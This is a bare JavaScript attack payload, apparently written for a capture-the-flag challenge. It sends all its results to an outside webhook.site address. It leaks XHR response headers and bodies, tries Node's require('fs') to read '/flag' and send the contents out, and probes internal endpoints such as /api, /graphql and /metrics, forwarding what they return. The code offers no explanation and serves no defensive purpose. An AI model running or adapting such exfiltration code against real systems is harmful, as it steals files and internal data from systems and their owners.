var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
// Try async XHR instead of sync
var x=new XMLHttpRequest();
x.onreadystatechange=function(){
  if(x.readyState==4){
    fetch(w+'/xhr_h?d='+encodeURIComponent(x.getAllResponseHeaders())+'&b='+encodeURIComponent(x.responseText.substring(0,200)));
  }
};
x.open('GET','/zombie?show=xhrtest',true);
x.send();

// Check if require is available
try {
  var fs = require('fs');
  var flag = fs.readFileSync('/flag','utf8');
  fetch(w+'/require?d='+encodeURIComponent(flag));
} catch(e) {
  fetch(w+'/require_err?d='+encodeURIComponent(e+''));
}

// Try other endpoints
['/api','/graphql','/status','/health','/info','/metrics'].forEach(function(p){
  fetch(p).then(function(r){return r.text()}).then(function(t){
    fetch(w+'/ep'+p.replace('/','_')+'?d='+encodeURIComponent(t.substring(0,200)));
  }).catch(function(){});
});
